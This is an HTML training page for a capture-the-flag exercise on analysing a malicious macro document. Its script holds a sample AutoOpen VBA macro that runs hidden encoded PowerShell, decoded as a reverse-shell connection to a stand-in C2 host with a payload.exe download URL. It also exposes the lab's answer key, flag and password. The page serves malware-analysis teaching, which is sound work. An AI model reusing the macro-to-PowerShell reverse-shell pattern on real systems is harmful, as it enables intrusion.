<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
  <title>CTF: Analyze Malicious Document | resume.docm Macro Analysis</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', 'Fira Code', 'Consolas', system-ui, monospace; }
    body {
      background: linear-gradient(160deg, #001a20 0%, #002835 50%, #001a20 100%);
      min-height: 100vh; display: flex; align-items: center; justify-content: center;
      padding: 1.5rem; margin: 0;
    }
    .container {
      max-width: 1200px; width: 100%; background: rgba(5, 20, 30, 0.95);
      backdrop-filter: blur(28px); border: 1px solid rgba(0, 180, 220, 0.4);
      box-shadow: 0 25px 50px rgba(0, 150, 200, 0.2); border-radius: 2.5rem;
      padding: 2rem; color: #c0e0f0;
    }
    h1 { font-size: 2.2rem; font-weight: 700; text-align: center; background: linear-gradient(135deg, #5ec8e8, #0077aa); -webkit-background-clip: text; -webkit-text-fill-color: transparent; margin-bottom: 0.4rem; letter-spacing: 1px; }
    .subtitle { text-align: center; color: #80b8d0; margin-bottom: 1.8rem; border-bottom: 1px dashed #2a5060; padding-bottom: 1rem; font-style: italic; }
    .panel { background: rgba(5, 15, 25, 0.9); backdrop-filter: blur(12px); border-radius: 1.8rem; padding: 1.7rem; border: 1px solid #2a5060; margin-bottom: 1.8rem; }
    .hidden { display: none !important; }
    input, button { background: #0a1a25; border: 1px solid #3a6a80; border-radius: 2rem; padding: 0.7rem 1.3rem; color: #d0e8f0; font-weight: 500; outline: none; font-size: 0.9rem; }
    input:focus { border-color: #4dc8e8; box-shadow: 0 0 14px #2299cc; }
    button { background: #1a3040; border-color: #4d99bb; cursor: pointer; font-weight: bold; display: inline-flex; align-items: center; gap: 0.3rem; }
    button:hover { background: #254050; border-color: #66c8e0; box-shadow: 0 0 18px #33aacc; }
    .task-card { background: #0a1520; border-left: 6px solid #4dc8e8; padding: 1.2rem; border-radius: 1.3rem; margin: 1.2rem 0; animation: fadeIn 0.35s ease; }
    @keyframes fadeIn { 0% { opacity: 0; transform: translateY(8px); } 100% { opacity: 1; transform: translateY(0); } }
    .vba-editor { background: #1e1e1e; border: 2px solid #569cd6; border-radius: 1rem; padding: 1rem; margin: 1rem 0; font-family: 'Fira Code', 'Consolas', monospace; font-size: 0.8rem; color: #d4d4d4; min-height: 300px; max-height: 500px; overflow-y: auto; box-shadow: 0 0 20px rgba(86, 156, 214, 0.3); }
    .vba-editor::before { content: "📝 VBA Editor - Module1 (resume.docm)"; display: block; background: #252526; padding: 0.4rem 1rem; margin: -1rem -1rem 0.8rem -1rem; border-bottom: 1px solid #569cd6; color: #ccc; font-weight: bold; font-size: 0.8rem; border-radius: 1rem 1rem 0 0; }
    .vba-keyword { color: #569cd6; font-weight: bold; }
    .vba-string { color: #ce9178; }
    .vba-comment { color: #6a9955; font-style: italic; }
    .vba-function { color: #dcdcaa; }
    .vba-danger { color: #f44747; font-weight: bold; background: #3a1010; padding: 0 4px; border-radius: 3px; }
    .log-line { background: #050a10; border: 1px solid #1a3040; padding: 0.5rem 1rem; border-radius: 0.6rem; margin: 0.4rem 0; font-family: 'Fira Code', monospace; font-size: 0.78rem; white-space: pre-wrap; color: #a0c8d8; }
    .badge { background: #1a3040; padding: 0.2rem 0.9rem; border-radius: 20px; font-size: 0.8rem; }
    .tool-output { background: #000810; border: 2px solid #4dc8e8; border-radius: 0.8rem; padding: 0.8rem; margin: 0.5rem 0; font-family: 'Fira Code', monospace; font-size: 0.75rem; color: #80d0e8; }
    .flag-box { background: #002030; border: 2px dashed #ffd700; padding: 0.9rem; border-radius: 20px; text-align: center; font-weight: bold; font-size: 1.4rem; letter-spacing: 3px; color: #ffd700; animation: glowGold 1.7s infinite; }
    @keyframes glowGold { 0% { box-shadow: 0 0 5px #ffd700; } 50% { box-shadow: 0 0 30px #ffaa00; } 100% { box-shadow: 0 0 5px #ffd700; } }
    .success-msg { color: #9effb7; font-weight: bold; }
    .toast { position: fixed; top: 20px; right: 20px; background: #0a1a30; border: 1px solid #4dc8e8; padding: 1rem 1.5rem; border-radius: 2rem; color: #d0e8f0; font-weight: bold; z-index: 9999; animation: slideIn 0.3s ease, fadeOut 0.3s 2.5s forwards; box-shadow: 0 10px 25px rgba(0,0,0,0.5); }
    @keyframes slideIn { from { transform: translateX(100px); opacity: 0; } to { transform: translateX(0); opacity: 1; } }
    @keyframes fadeOut { to { opacity: 0; transform: translateY(-10px); } }
    code { background: #0a1a25; padding: 0.2rem 0.6rem; border-radius: 12px; font-family: 'Fira Code', monospace; }
  </style>
</head>
<body>
<div class="container" id="appContainer">

  <div id="loginSection">
    <h1>📄 MALDOC HUNTER CTF</h1>
    <div class="subtitle">Macro-Enabled Document Analysis · resume.docm Investigation</div>
    <div class="panel">
      <div style="text-align:center;">
        <input type="text" id="studentNameInput" placeholder="Enter your name" autocomplete="off" style="width:70%;">
        <input type="password" id="studentPassInput" placeholder="Enter password" style="width:70%; margin-top:0.7rem;">
        <button id="studentSubmitLogin" style="margin-top:0.8rem;">🔐 Enter CTF Lab</button>
        <p style="font-size:0.8rem; color:#80b8d0; margin-top:0.5rem;">
          Password: <code>45_2026</code>
        </p>
      </div>
    </div>
  </div>

  <div id="studentDashboard" class="hidden">
    <div style="display:flex; justify-content:space-between; align-items:center;">
      <h2 style="color:#5ec8e8;">👤 <span id="displayStudentName"></span></h2>
      <button id="logoutStudentBtn">🚪 Logout</button>
    </div>
    <div id="taskContainer"></div>
  </div>

</div>

<script>
(function() {
    const FIXED_PASSWORD = '45_2026';
    const STORAGE_KEY = 'maldoc_ctf_progress';
    
    let currentUser = null;
    let completedTasks = [];
    let vbaRevealed = false;

    function loadProgress() {
        try { const s = localStorage.getItem(STORAGE_KEY); if(s){ const d=JSON.parse(s); completedTasks=d.completed||[]; return d.name; } } catch(e) {}
        return null;
    }
    function saveProgress() { if(currentUser) localStorage.setItem(STORAGE_KEY, JSON.stringify({name:currentUser.name, completed:currentUser.completedTasks})); }

    const tasks = [
      { id: 1, title: "🔍 Task 1: Extract Macros", desc: "Which auto-execute macro is found by olevba?", answer: "AutoOpen", extra: "olevba" },
      { id: 2, title: "⚠️ Task 2: Malicious VBA Code", desc: "Find the Shell command that executes PowerShell (start with 'Shell')", answer: 'Shell("powershell -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAbQBhAGwAaQBjAGkAbwB1AHMALQBjADIALgBlAHgAYQBtAHAAbABlAC4AYwBvAG0AIgAsACAANAA0ADMAKQA7AA==")', extra: "vba" },
      { id: 3, title: "🔓 Task 3: Decode Base64", desc: "What domain does the decoded payload connect to?", answer: "malicious-c2.example.com", extra: "decode" },
      { id: 4, title: "🌐 Task 4: Payload URL", desc: "What is the full second stage payload URL?", answer: "http://malicious-c2.example.com/payload.exe", extra: "url" },
      { id: 5, title: "📊 Task 5: Document IOCs", desc: "Format: 'domain,hash' (no spaces)", answer: "malicious-c2.example.com,a1b2c3d4e5f6789012345678abcdef01", extra: "iocs" }
    ];

    const docHash = "a1b2c3d4e5f6789012345678abcdef01";
    const c2Domain = "malicious-c2.example.com";
    const payloadUrl = `http://${c2Domain}/payload.exe`;
    const decodedPayload = `$client = New-Object System.Net.Sockets.TCPClient("${c2Domain}", 443);`;

    const olevbaOut = `[olevba] Analyzing: resume.docm | MACROS FOUND: AutoOpen(), Workbook_Open(), Document_Close() | Suspicious: Shell, powershell, Base64Decode, TCPClient | Risk: HIGH (0.95) | ⚠️ AutoOpen() contains Shell execution!`;

    const vbaCode = `<span class="vba-keyword">Private Sub</span> <span class="vba-function">AutoOpen</span>()
    <span class="vba-keyword">Dim</span> cmd <span class="vba-keyword">As String</span>
    cmd = <span class="vba-string">"powershell -enc JABjAGwAaQBlAG4AdAA..."</span>
    <span class="vba-keyword">Set</span> objShell = <span class="vba-function">CreateObject</span>(<span class="vba-string">"WScript.Shell"</span>)
    <span class="vba-danger">objShell.Run cmd, 0, False</span>  <span class="vba-comment">' HIDE WINDOW!</span>
    http.Open <span class="vba-string">"GET"</span>, <span class="vba-string">"${payloadUrl}"</span>, <span class="vba-keyword">False</span>
<span class="vba-keyword">End Sub</span>`;

    function showToast(m, e) {
      const x=document.querySelector('.toast'); if(x)x.remove();
      const t=document.createElement('div'); t.className='toast';
      t.style.background=e?'#3a1a1a':'#0a1a30'; t.style.borderColor=e?'#aa3030':'#4dc8e8';
      t.style.color=e?'#ffaaaa':'#d0e8f0'; t.textContent=m;
      document.body.appendChild(t); setTimeout(()=>{if(t.parentNode)t.remove();},3000);
    }

    function createVBAEditor() {
      let h = '<p style="color:#80c8e0;">📝 VBA Macro Code:</p><div class="vba-editor" id="vbaEditor">';
      h += '<div style="text-align:center;padding:2rem;"><button onclick="window.revealVBA()" style="font-size:1rem;">🔍 Click to Reveal VBA Code</button></div></div>';
      return h;
    }
    window.revealVBA = () => { vbaRevealed=true; const e=document.getElementById('vbaEditor'); if(e){e.innerHTML=vbaCode; e.style.textAlign='left';} };

    function renderTasks() {
      if(!currentUser) return;
      document.getElementById('displayStudentName').innerText=currentUser.name;
      const c=document.getElementById('taskContainer'), done=currentUser.completedTasks||[];
      let h='<h3>📄 Malicious Document Analysis Workstation</h3>';
      h+=createVBAEditor();
      h+=`<div class="tool-output"><pre>${olevbaOut}</pre></div>`;
      tasks.forEach(t=>{
        const dn=done.includes(t.id);
        h+=`<div class="task-card" style="border-left-color:${dn?'#2ecc71':'#4dc8e8'};"><strong>${t.title}</strong> <span class="badge">${dn?'✅ Done':'🔒 Pending'}</span><p>${t.desc}</p>`;
        if(t.extra==='decode') h+=`<div class="tool-output"><pre style="color:#ffd700;">${decodedPayload}</pre></div>`;
        else if(t.extra==='iocs') h+=`<div class="log-line">C2: ${c2Domain} | Hash: ${docHash} | URL: ${payloadUrl}</div>`;
        if(!dn) h+=`<div style="display:flex;gap:0.5rem;margin-top:0.5rem;"><input type="text" id="ai${t.id}" placeholder="Your answer" style="flex:1;"><button onclick="window.submitT(${t.id})">✅ Submit</button></div>`;
        else h+='<p class="success-msg">✔ Completed</p>';
        h+='</div>';
      });
      if(done.length===tasks.length) h+='<div class="flag-box">🏆 FLAG{MALICIOUS_MACRO} 🏆</div>';
      c.innerHTML=h; if(vbaRevealed) setTimeout(()=>window.revealVBA(),100);
    }

    window.submitT = id => {
      if(!currentUser) return;
      const inp=document.getElementById('ai'+id); if(!inp) return;
      const a=inp.value.trim(), t=tasks.find(x=>x.id===id); if(!t) return;
      let ok=false;
      if(id===2){ const l=a.toLowerCase(); ok=l.startsWith('shell(')&&l.includes('powershell')&&l.includes('-enc'); }
      else if(id===5){ const p=a.split(','); ok=p.length===2&&p[0].toLowerCase()===c2Domain&&p[1].toLowerCase()===docHash; }
      else ok=a.toLowerCase()===t.answer.toLowerCase();
      if(ok){ if(!currentUser.completedTasks.includes(id)){currentUser.completedTasks.push(id);saveProgress();} showToast('✅ Correct!'); renderTasks(); }
      else{ showToast('❌ Incorrect.',true); inp.style.animation='shake 0.5s ease'; setTimeout(()=>inp.style.animation='',500); }
    };

    function showLogin() { document.getElementById('loginSection').classList.remove('hidden'); document.getElementById('studentDashboard').classList.add('hidden'); currentUser=null; }
    function showDash() { document.getElementById('loginSection').classList.add('hidden'); document.getElementById('studentDashboard').classList.remove('hidden'); vbaRevealed=false; renderTasks(); }

    document.addEventListener('DOMContentLoaded',()=>{
      const sn=loadProgress(); if(sn) document.getElementById('studentNameInput').value=sn;
      document.getElementById('studentSubmitLogin').addEventListener('click',()=>{
        const n=document.getElementById('studentNameInput').value.trim();
        const p=document.getElementById('studentPassInput').value.trim();
        if(!n||!p){showToast('Enter name and password.',true);return;}
        if(p!==FIXED_PASSWORD){showToast('Invalid password. Use: 45_2026',true);return;}
        currentUser={name:n,completedTasks:[...completedTasks]};
        document.getElementById('studentPassInput').value=''; showDash();
      });
      document.getElementById('logoutStudentBtn').addEventListener('click',()=>{showToast('Logged out.');showLogin();});
      const s=document.createElement('style'); s.textContent='@keyframes shake{0%,100%{transform:translateX(0)}25%{transform:translateX(-10px)}75%{transform:translateX(10px)}}';
      document.head.appendChild(s); showLogin();
    });
})();
</script>
</body>
</html>
